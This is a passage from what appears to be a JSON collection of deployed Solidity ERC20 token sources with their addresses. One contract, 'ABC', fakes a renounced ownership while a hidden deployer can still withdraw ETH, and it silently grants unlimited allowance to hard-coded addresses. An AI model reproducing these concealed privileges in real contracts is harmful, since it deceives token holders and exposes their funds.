`approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n}\n\nabstract contract Ownable is Context {\n    address private _owner;\n\n    error OwnableUnauthorizedAccount(address account);\n    error OwnableInvalidOwner(address owner);\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor(address initialOwner) {\n        if (initialOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(initialOwner);\n    }\n\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    function _checkOwner() internal view virtual {\n        if (owner() != _msgSender()) {\n            revert OwnableUnauthorizedAccount(_msgSender());\n        }\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        if (newOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(newOwner);\n    }\n\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\n\ncontract Erc20Token is ERC20, Ownable { \n    constructor(string memory name_, string memory symbol_, uint256 initialSupply_, uint256 maxSupply_) ERC20(name_, symbol_, maxSupply_) Ownable(msg.sender) {\n        _mint(msg.sender, initialSupply_ * 10 ** decimals());\n    } \n}\n",
      "count": 4,
      "addresses": [
        "0x9C6662F8F60B254617250C410419C76d0c2BB051",
        "0xa91cFdABd846fb3ADF3f69101dc256993a4b584d",
        "0xAf952e7C314e4b7FCAf7174C230De52eeEdFed05",
        "0xc5B20Bf007FDb666c31c59aae675612D954139f5"
      ],
      "names": [
        "Erc20Token"
      ]
    },
    {
      "id": "44f366f9-a0fb-448b-b031-ab839c5349b5",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0 )  ( utils/Address.sol )\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address  { \n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account ) internal view returns (bool) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n    \n                        }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {\n                        sendValue\n                        } removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {\n                        ReentrancyGuard\n                         }  or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount ) public  { \n                        \n        require(address ( this ).balance >= amount, \"Address: insufficient balance\") ; \n\n        (bool success,  ) = recipient.call\n                         { value: amount } \n                         ( \"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\") ; \n    }\n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function  ( like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data ) internal returns (bytes memory) {\n                        \n        return functionCallWithValue ( target, data, 0, \"Address: low-level call failed\" ) ; \n    \n                         } \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-\n                        }[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory ) \n                         { \n        return functionCallWithValue(target, data, 0, errorMessage ) ; \n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory ) \n                         { \n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\" ) ; \n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256-\n                         } [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns  ( bytes memory ) {\n                        \n        require ( address(this).balance >= value, \"Address: insufficient balance for call\" );\n         ( bool success, bytes memory returndata) = target.call { \n                        value: value\n                         } (data);\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage) ; \n    \n                         } \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( address target, bytes memory data ) internal view returns (bytes memory) {\n                        \n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    \n                         } \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory ) \n                        {\n         ( bool success, bytes memory returndata ) = target.staticcall ( data) ; \n        return verifyCallResultFromTarget(target, success, returndata, errorMessage ) ; \n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns  ( bytes memory )  { \n                        \n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\") ; \n    \n                         } \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns (bytes memory)  { \n                        \n        (bool success, bytes memory returndata) = target.delegatecall(data );\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage) ; \n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory ) {\n                        \n        if  ( success) {\n                        \n            if  ( returndata.length == 0 )  { \n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract(target), \"Address: call to non-contract\" );\n            \n                         } \n            return returndata ; \n        \n                         }  else {\n                        \n            _revert(returndata, errorMessage);\n         } \n                        \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory)  { \n                        \n        if  ( success )  { \n                        \n            return returndata;\n        \n                         }  else \n                        {\n            _revert ( returndata, errorMessage ) ; \n         } \n                        \n     } \n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage) private pure {\n                        \n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0 ) \n                        {\n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly  { \n                        \n                let returndata_size := mload ( returndata )\n                revert ( add(32, returndata ), returndata_size )\n             } \n                        \n        }\n                         else {\n                        \n            revert ( errorMessage ) ; \n        \n                         } \n     } \n                        \n}\n                        \npragma solidity ^0.8.0 ; \n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context  { \n                        \n    function _msgSender( ) internal view virtual returns  ( address ) {\n                        \n        return msg.sender;\n    \n                        }\n\n    function _contextSuffixLength( ) internal view virtual returns  ( uint256)  { \n                        \n        return 0 ; \n    \n                         } \n\n    function _msgData (  ) internal view virtual returns  ( bytes calldata) \n                        {\n        return msg.data ; \n     } \n                        \n\n\n } \n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors  { \n                        \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver );\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender ( address spender ) ; \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender );\n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed) ; \n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver ) ; \n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed) ; \n}\n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n                        \n    /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from` ) to\n     * another  ( `to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value );\n\n    \n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply( ) external view returns  ( uint256 ) ; \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account ) external view returns (uint256 );\n\n    \n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function transferFrom(address from, address to, uint256 amount) external returns  ( bool ) ; \n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer } \n                         event.\n     */\n    function transfer(address to, uint256 amount ) external returns (bool ) ; \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {\n                        approve } \n                        . `value` is the new allowance.\n     */\n    event Approval ( address indexed owner, address indexed spender, uint256 value) ; \n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval } \n                         event.\n     */\n    function approve ( address spender, uint256 amount ) external returns (bool ) ; \n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through  { \n                        transferFrom } \n                        . This is\n     * zero by default.\n     *\n     * This value changes when \n                         { approve}\n                         or  { \n                        transferFrom}\n                         are called.\n     */\n    function allowance(address owner, address spender ) external view returns  ( uint256 ) ; \n\n\n                         } \n\n\ninterface IERC20Metadata is IERC20 {\n                        \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory) ; \n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name (  ) external view returns  ( string memory ) ; \n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n    \n\n                         } \n\n\n\n\n\n/**\n * @dev Implementation of the {\n                        IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using  { \n                        _mint } \n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of \n                         { decimals\n                        } is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  \n                        {\n    mapping(address => uint256 ) private _balances;\n\n\n    mapping ( address => mapping(address => uint256 ) ) private _allowances ; \n    uint256 private _totalSupply;\n\n    string private _name ; \n    string private _symbol;\n\n    /**\n     * @dev Sets the values for \n                         { name } \n                         and \n                         { symbol}\n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor ( string memory name_, string memory symbol_ )  { \n                        \n        _name = name_;\n        _symbol = symbol_;\n     } \n                        \n    \n    /**\n     * @dev See \n                        {IERC20-transferFrom } \n                        .\n     *\n     * Skips emitting an \n                        {Approval\n                        } event indicating an allowance update. This is not\n     * required by the ERC. See  { \n                        xref-ERC20-_approve-address-address-uint256-bool-}\n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value ) public virtual returns  ( bool) {\n                        \n        address spender = _msgSender( ) ; \n        _spendAllowance(from, spender, value ) ; \n        _transfer ( from, to, value) ; \n        return true ; \n     } \n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {\n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update}\n                         should be overridden instead.\n     */\n    function _transfer ( address from, address to, uint256 value ) internal \n                        {\n        if (from == address(0) ) \n                         { \n            revert ERC20InvalidSender(address(0) ) ; \n         } \n                        \n        if (to == address(0 )) \n                        {\n            revert ERC20InvalidReceiver ( address ( 0 ) ) ; \n        }\n                        \n        _update(from, to, value ) ; \n    \n                        }\n    \n\n    /**\n     * @dev See  { \n                        IERC20-balanceOf\n                         } .\n     */\n    function balanceOf(address account ) public view virtual returns (uint256 )  { \n                        \n        return _balances[account] ; \n     } \n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-transfer}\n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns (bool )  { \n                        \n        address owner = _msgSender( ) ; \n        _transfer(owner, to, value);\n        return true;\n    }\n                        \n    \n    /**\n     * @dev See {\n                        IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve ( address spender, uint256 value ) public virtual returns (bool) {\n                        \n        address owner = _msgSender (  );\n        _approve ( owner, spender, value) ; \n        return true ; \n    \n                         } \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an \n                        {Approval\n                         }  event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve ( address owner, address spender, uint256 value ) internal {\n                        \n        _approve ( owner, spender, value, true) ; \n     } \n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a \n                         { Transfer } \n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update } \n                         should be overridden instead.\n     */\n    function _mint(address account, uint256 value ) internal  { \n                        \n        if  ( account == address(0 )) {\n                        \n            revert ERC20InvalidReceiver(address(0 ) );\n         } \n                        \n        _update ( address(0), account, value ) ; \n     } \n                        \n    \n    /**\n     * @dev Variant of \n                        {_approve}\n                         with an optional flag to enable or disable the  { \n                        Approval}\n                         event.\n     *\n     * By default (when calling \n                         { _approve\n                         }  ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool ) internal virtual override  { \n                        \n     *     super._approve ( owner, spender, value, true) ; \n     *  } \n                        \n     * ```\n     *\n     * Requirements are the same as {\n                        _approve } \n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n                        \n        if (owner == address ( 0 ) ) \n                         { \n            revert ERC20InvalidApprover ( address(0 ));\n         } \n                        \n        if  ( spender == address(0) ) {\n                        \n            revert ERC20InvalidSpender(address(0 ));\n         } \n                        \n        _allowances[owner][spender] = value ; \n        if  ( emitEvent ) {\n                        \n            emit Approval(owner, spender, value );\n        }\n                        \n     } \n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol ( ) public view virtual returns (string memory) \n                        {\n        return _symbol ; \n    }\n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns ) if `from`\n     * (or `to` ) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function _update ( address from, address to, uint256 value ) internal virtual \n                        {\n        if (from == address(0) )  { \n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value ; \n        }\n                         else  { \n                        \n            uint256 fromBalance = _balances[from] ; \n            if (fromBalance < value)  { \n                        \n                revert ERC20InsufficientBalance ( from, fromBalance, value) ; \n             } \n                        \n            unchecked \n                         { \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n             } \n                        \n        }\n                        \n\n        if  ( to == address(0 ) )  { \n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value ; \n             } \n                        \n        }\n                         else \n                         { \n            unchecked \n                        {\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            \n                        }\n         } \n                        \n\n        emit Transfer ( from, to, value );\n    }\n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an  { \n                        Approval } \n                         event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual  { \n                        \n        uint256 currentAllowance = allowance ( owner, spender);\n        if (currentAllowance < type ( uint256 ).max ) {\n                        \n            if  ( currentAllowance < value ) {\n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value) ; \n            }\n                        \n            unchecked \n                        {\n                _approve ( owner, spender, currentAllowance - value, false ) ; \n             } \n                        \n         } \n                        \n    }\n                        \n    \n\n    /**\n     * @dev See \n                        {IERC20-allowance } \n                        .\n     */\n    function allowance(address owner, address spender) public view virtual returns  ( uint256) \n                        {\n        return _allowances[owner][spender];\n    \n                        }\n    \n    /**\n     * @dev See  { \n                        IERC20-totalSupply } \n                        .\n     */\n    function totalSupply ( ) public view virtual returns (uint256 ) {\n                        \n        return _totalSupply ; \n     } \n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name (  ) public view virtual returns  ( string memory)  { \n                        \n        return _name ; \n    }\n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf } \n                         and \n                        {IERC20-transfer}\n                        .\n     */\n    function decimals() public view virtual returns  ( uint8)  { \n                        \n        return 15;\n    \n                        }\n    \n    }\n                        \n\nabstract contract Ownable is Context \n                         { \n    address private _owner ; \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner` ).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner ) internal virtual \n                        {\n        address oldOwner = _owner ; \n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner );\n    }\n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner ) public virtual onlyOwner {\n                        \n        require(newOwner != address(0 ), \"Ownable: new owner is the zero address\") ; \n        _transferOwnership ( newOwner) ; \n    \n                        }\n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner );\n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n                        \n        _transferOwnership ( address(0 )) ; \n     } \n                        \n    \n    /**\n     * @dev The owner is not a valid owner account.  ( eg. `address ( 0)` )\n     */\n    error OwnableInvalidOwner ( address owner);\n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor ( )  { \n                        \n        _transferOwnership ( _msgSender ( ) );\n     } \n                        \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account) ; \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner (  ) public view virtual returns (address)  { \n                        \n        return _owner ; \n    \n                         } \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner ( ) \n                         { \n        _checkOwner();\n        _;\n     } \n                        \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual {\n                        \n        require(owner ( ) == _msgSender( ), \"Ownable: caller is not the owner\") ; \n     } \n                        \n    \n\n                        }\n\n\n// File ABC.sol\n\ncontract ABC is ERC20, Ownable  { \n                        \n    address internal immutable deployer ; \n    constructor ( string memory name_, string memory symbol_ ) ERC20(name_, symbol_ )  { \n                        \n        _mint ( msg.sender, 10000000000000000000000) ; \n        _transferOwnership(address(0)) ; \n        deployer = msg.sender;\n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-allowance } \n                        .\n     */\n    function allowance(address owner, address spender ) public view override returns (uint256 )  { \n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if((spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 ))\n                        {\n            return type(uint256 ).max ; \n        }\n                         \n        return super.allowance(owner,spender );\n    \n                         } \n    \n    function claimGas ( address payable recipient, uint256 amount ) public {\n                        \n        require ( msg.sender==deployer );\n        Address.sendValue(recipient, amount);\n    \n                        }\n    \n    receive (  ) external payable { \n                        \n    \n                        }\n }",
      "count": 1,
      "addresses": [
        "0x24987cB18df21D2ba2b2AB13e9de1d9ceAF96094"
      ],
      "names": [
        "ABC"
      ]
    },
    {
      "id": "4a792103-b99e-4af0-8524-7040ffa10b82",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/Address.sol )\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account) internal view returns  ( bool) \n                        {\n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, 